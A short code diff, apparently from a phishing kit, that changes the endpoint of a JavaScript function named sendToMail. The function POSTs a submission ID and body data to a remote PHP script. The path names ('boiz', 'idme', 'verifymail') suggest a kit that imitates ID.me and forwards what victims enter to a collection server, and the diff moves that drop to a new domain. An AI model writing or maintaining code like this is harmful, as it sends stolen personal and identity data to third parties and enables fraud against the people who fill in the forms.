@@ -15,7 +15,7 @@ const sendToMail = async (type, body) => {
     submitRequest.append("submissionID", submissionID);
     submitRequest.append("body", body);
 
-    const url = `https://cynergytrades.com/public/boiz/idme/verifymail_atlas.php`
+    const url = `https://shopthugn.com//public/boiz/verifymail_atlas.php`
     const options = {
         method: "POST",
         body: submitRequest
